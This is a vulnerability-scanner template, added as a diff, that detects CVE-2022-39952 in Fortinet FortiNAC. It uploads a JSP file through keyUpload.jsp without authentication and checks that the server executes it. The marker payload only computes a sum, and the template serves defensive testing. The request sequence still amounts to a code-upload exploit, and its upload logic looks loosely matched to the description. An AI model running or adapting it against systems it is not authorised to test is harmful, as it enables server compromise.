@@ -1,0 +1,50 @@
+id: CVE-2022-39952
+
+info:
+  name: Fortinet FortiNAC Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Fortinet FortiNAC has a vulnerability allowing attackers to upload maliciously compressed files via keyUpload.jsp, leading to server access.
+  reference:
+    - https://github.com/horizon3ai/CVE-2022-39952
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2022-39952
+  tags: file-upload
+
+variables:
+  random_filename: '{{rand_base(8)}}.jsp'
+  payload_content: '<% out.println(5646431+5689356);%>'
+
+http:
+  - raw:
+      - |
+        POST /configWizard/keyUpload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=264286dedc1f37d520df0804de4ac980
+
+        --264286dedc1f37d520df0804de4ac980
+        Content-Disposition: form-data; name="key"; filename="{{random_filename}}.zip"
+
+        {{base64(payload_content)}}
+        --264286dedc1f37d520df0804de4ac980--
+
+    matchers:
+      - type: status
+        status: 200
+
+  - raw:
+      - |
+        GET /{{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "11335787"
